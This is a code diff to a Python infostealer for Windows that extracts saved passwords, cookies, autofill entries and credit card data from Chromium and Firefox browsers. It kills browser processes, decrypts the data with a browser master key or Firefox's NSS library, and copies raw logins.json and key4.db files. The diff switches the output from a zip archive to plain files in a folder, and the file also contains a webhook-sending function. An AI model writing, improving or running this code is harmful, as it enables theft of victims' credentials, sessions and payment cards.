@@ -9,7 +9,6 @@ import sqlite3
 import pathlib
 import binascii
 import subprocess
-import zipfile
 import time
 from io import BytesIO
 import windows
@@ -370,11 +369,14 @@ def get_master_key(config):
         print(f"   [!] Master key retrieval failed: {e}")
         return None
 
-def write_to_zip(zf, zip_path: str, content: str):
+def write_to_file(base_path: str, rel_path: str, content: str):
     if content.strip():
-        zf.writestr(zip_path, content.encode('utf-8'))
+        full_path = os.path.join(base_path, rel_path)
+        os.makedirs(os.path.dirname(full_path), exist_ok=True)
+        with open(full_path, 'w', encoding='utf-8') as f:
+            f.write(content)
 
-def process_chromium_browser(browser_name, config, master_key, zf):
+def process_chromium_browser(browser_name, config, master_key, base_path):
     user_profile = os.environ['USERPROFILE']
     data_path = pathlib.Path(user_profile) / config['data_path']
     if not data_path.exists():
@@ -430,7 +432,7 @@ def process_chromium_browser(browser_name, config, master_key, zf):
                     
                     # Sadece gerçek password varsa dosya oluştur
                     if passwords_content.strip():
-                        write_to_zip(zf, prefix + "passwords.txt", passwords_content)
+                        write_to_file(base_path, prefix + "passwords.txt", passwords_content)
                     
                 except:
                     pass
@@ -459,7 +461,7 @@ def process_chromium_browser(browser_name, config, master_key, zf):
                     con.close()
                     
                     if cookies_content.strip():
-                        write_to_zip(zf, prefix + "cookies.txt", cookies_content)
+                        write_to_file(base_path, prefix + "cookies.txt", cookies_content)
 
                 except:
                     pass
@@ -505,9 +507,9 @@ def process_chromium_browser(browser_name, config, master_key, zf):
                     con.close()
                     
                     if autofill_content:
-                        write_to_zip(zf, prefix + "auto_fills.txt", autofill_content)
+                        write_to_file(base_path, prefix + "auto_fills.txt", autofill_content)
                     if credit_cards_content:
-                        write_to_zip(zf, prefix + "credit_cards.txt", credit_cards_content)
+                        write_to_file(base_path, prefix + "credit_cards.txt", credit_cards_content)
 
                 except:
                     pass
@@ -516,7 +518,7 @@ def process_chromium_browser(browser_name, config, master_key, zf):
                 except: 
                     pass
 
-def process_firefox_browser(browser_name, config, zf):
+def process_firefox_browser(browser_name, config, base_path):
     user_profile = os.environ['USERPROFILE']
     profiles_path = pathlib.Path(user_profile) / config['data_path']
     if not profiles_path.exists(): return
@@ -548,7 +550,7 @@ def process_firefox_browser(browser_name, config, zf):
                 for host, name, value, path, expiry, secure in cur.fetchall():
                     cookies_content += f"{host}\tTRUE\t{path}\t{str(bool(secure)).upper()}\t{expiry}\t{name}\t{value}\n"
                 con.close()
-                if cookies_content: write_to_zip(zf, prefix + "cookies.txt", cookies_content)
+                if cookies_content: write_to_file(base_path, prefix + "cookies.txt", cookies_content)
             except: pass
 
         # Passwords (Decryption with NSS)
@@ -557,10 +559,16 @@ def process_firefox_browser(browser_name, config, zf):
         
         # Add Raw Files
         if logins_json.exists(): 
-            try: zf.write(logins_json, prefix + "raw/logins.json")
+            try:
+                dest = os.path.join(base_path, prefix, "raw/logins.json")
+                os.makedirs(os.path.dirname(dest), exist_ok=True)
+                shutil.copy2(logins_json, dest)
             except: pass
         if (profile_dir / "key4.db").exists():
-            try: zf.write(profile_dir / "key4.db", prefix + "raw/key4.db")
+            try:
+                dest = os.path.join(base_path, prefix, "raw/key4.db")
+                os.makedirs(os.path.dirname(dest), exist_ok=True)
+                shutil.copy2(profile_dir / "key4.db", dest)
             except: pass
 
         if logins_json.exists() and nss_dll:
@@ -601,7 +609,7 @@ def process_firefox_browser(browser_name, config, zf):
             
         if passwords_content.strip():
             print(f"   [+] {profile_dir.name}: Extracted {passwords_content.count('URL:')} passwords")
-            write_to_zip(zf, prefix + "passwords.txt", passwords_content)
+            write_to_file(base_path, prefix + "passwords.txt", passwords_content)
 
 def send_to_webhook(zip_path, webhook_url):
     if not os.path.exists(zip_path):
@@ -648,28 +656,24 @@ def main():
         kill_browser_processes()
         time.sleep(1)
         
-        zip_buffer = BytesIO()
-        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
-            for n, c in BROWSERS.items():
-                try:
-                    print(f"Processing {c['name']}...")
-                    if c['chromium_based']:
-                        mk = get_master_key(c)
-                        if mk: 
-                            process_chromium_browser(n, c, mk, zf)
-                        else:
-                            print(f"   [!] Failed to get master key for {c['name']}")
-                    else:
-                        process_firefox_browser(n, c, zf)
-                except Exception as e: 
-                    print(f"   [!] Error in browser {n}: {e}")
+        out = args.output_path if args.output_path else "output"
+        if not os.path.exists(out): os.makedirs(out, exist_ok=True)
 
-        out = args.output_path if args.output_path else "output.zip"
-        if os.path.dirname(out): os.makedirs(os.path.dirname(out), exist_ok=True)
-        
-        with open(out, "wb") as f:
-            f.write(zip_buffer.getvalue())
-        print(f"Successfully saved to {out}")
+        for n, c in BROWSERS.items():
+            try:
+                print(f"Processing {c['name']}...")
+                if c['chromium_based']:
+                    mk = get_master_key(c)
+                    if mk: 
+                        process_chromium_browser(n, c, mk, out)
+                    else:
+                        print(f"   [!] Failed to get master key for {c['name']}")
+                else:
+                    process_firefox_browser(n, c, out)
+            except Exception as e: 
+                print(f"   [!] Error in browser {n}: {e}")
+
+        print(f"Successfully saved to folder: {out}")
     except Exception as e:
         print(f"CRITICAL ERROR in main loop: {e}")
         import traceback
